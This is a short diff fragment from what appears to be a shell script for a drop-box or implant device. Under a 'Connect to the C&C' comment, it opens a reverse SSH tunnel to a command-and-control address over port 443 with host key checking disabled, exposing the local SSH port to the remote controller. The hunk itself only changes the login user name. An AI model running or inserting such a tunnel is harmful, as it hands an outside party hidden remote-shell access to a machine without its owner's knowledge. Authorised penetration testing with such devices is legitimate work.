@@ -11,5 +11,5 @@ else
     
     ## Connect to the C&C ##
     echo Connecting...
-    ssh -nNT -i id_rsa drone@$CNC_IP -p 443 -o StrictHostKeyChecking=no -R 2222:127.0.0.1:22 &
+    ssh -nNT -i id_rsa dropbox@$CNC_IP -p 443 -o StrictHostKeyChecking=no -R 2222:127.0.0.1:22 &
 fi
